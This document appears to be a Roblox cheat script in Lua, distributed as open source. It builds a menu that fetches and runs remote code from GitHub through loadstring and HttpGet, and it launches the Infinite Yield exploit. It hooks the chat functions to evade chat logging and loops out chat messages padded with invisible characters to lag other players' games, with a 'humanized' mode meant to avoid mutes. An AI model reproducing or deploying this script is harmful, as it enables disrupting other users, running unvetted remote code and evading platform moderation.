--[[

 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ      
â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   
â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ      
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
                                                                                     
@ Open Source;
Give Credits if Possible :)
Figure it out yourself but if you need help just hit me up :)

]]


--[[

	User Interface Libraries List
	: Do not touch anything below or you might make a problem.

]]

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Fuzki-UI-Library/main/FuzkiLibrary.lua"))()
local Main = Library:Create("QunityÂ® UNCOPYLOCKED", "Universal")

local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;

--[[

	Variables List
	: Do not change any variable names or it can cause a problem.

]]

local localPlayer = game.Players.LocalPlayer

local function getRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    if players[randomIndex] == localPlayer then
        return getRandomPlayer()
    end
    return players[randomIndex]
end

local usedMessages = {}
local function getNextMessage()
    for i = 1, #Messages do
        local message = Messages[math.random(1, #Messages)]
        if not usedMessages[message] then
            usedMessages[message] = true
            return message
        end
    end
    return "bro ðŸ’€"
end

local randomPlayer = getRandomPlayer()
local message = getNextMessage()
local Unicode = "â€Š"
message = message .. Unicode:rep(200 - #message)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)

_G.times = 7

--[[

	Functions List
	: Do not change any function names or it can cause a problem.

]]

function fireFPSLAG()
    if SayMessageRequest then
        for i = 1, _G.times do
            SayMessageRequest:FireServer(message, "All")
            task.wait(TextDelay)
            message = getNextMessage()
            message = message .. Unicode:rep(200 - #message)
        end
    end
    Notify({
        Description = "Do not spam Fire, High Probability you will get muted.";
        Title = "Warning!";
        Duration = 5;
    });
end

function fireLAG()
    if SayMessageRequest then
        for i = 1, _G.times do
            local aids = "QunityÂ® ðŸ˜Ž"
            local Unicode = "â€Š"
            aids = aids .. Unicode:rep(200 - #aids)
            SayMessageRequest:FireServer(aids, "All")
        end
    end
    Notify({
        Description = "Do not spam Fire, High Probability you will get muted.";
        Title = "Warning!";
        Duration = 5;
    });
end

function fireLAG2()
    if SayMessageRequest then
            local aids = "QunityÂ® ðŸ˜Ž"
            local Unicode = "â€Š"
            aids = aids .. Unicode:rep(200 - #aids)
            SayMessageRequest:FireServer(aids, "All")
    end
    Notify({
        Description = "Do not spam Fire, High Probability you will get muted.";
        Title = "Warning!";
        Duration = 5;
    });
end

local safe = Main:CreateSection("Safety")

safe:CreateToggle("ChatEnabled [Recommended = OFF]", function(state)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, state)
end)

safe:CreateButton("INFYield", "Execute", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
end)

safe:CreateButton("Fire", "Anti ChatLog 1 [RECOMMENDED]", function()
local CloneFunction = clonefunction
local CheckCaller = CloneFunction(checkcaller)
local HookFunction = CloneFunction(hookfunction)
local LocalPlayer = game.Players.PlayerAdded:wait()

local PostMessage = require(LocalPlayer:WaitForChild("PlayerScripts", 1/0):WaitForChild("ChatScript", 1/0):WaitForChild("ChatMain", 1/0)).MessagePosted
getgenv().MessageEvent = Instance.new("BindableEvent")

local OldFunctionHook
local PostMessageHook = function(self, msg)
   if not CheckCaller() and self == PostMessage then
       MessageEvent:Fire(msg)
       return
   end
   return OldFunctionHook(self, msg)
end
OldFunctionHook = HookFunction(PostMessage.fire, PostMessageHook)
Notify({
Description = "You are now 99.9% safer!";
Title = "Hooked";
Duration = 5;
});
end)

local fps = Main:CreateSection("FPS Lag")


fps:CreateSlider(7, 8, "Times", function(val)
_G.times = val
end)

fps:CreateButton("Fire", "FPS Lag Method", function()
    fireLAG2()
end)

fps:CreateToggle("Loop-Fire", function(state)
	_G.fpsLOOP = state
    while wait() and _G.fpsLOOP do
		fireLAG()
		task.wait(15) -- Changed to 15 due to Spam Blocks
	end
end)

fps:CreateToggle("Humanized-LF", function(state)
	_G.LFoop = state
    while wait() and _G.LFoop do
		SayMessageRequest:FireServer("am i the only one lagging??", "All")
		task.wait(math.random(5,7))
		fireFPSLAG()
	end
end)

--[[
Preview:CreateTextBox("TextBox Info", "PlaceHolder", function(v)
print(v) 
end)
]]
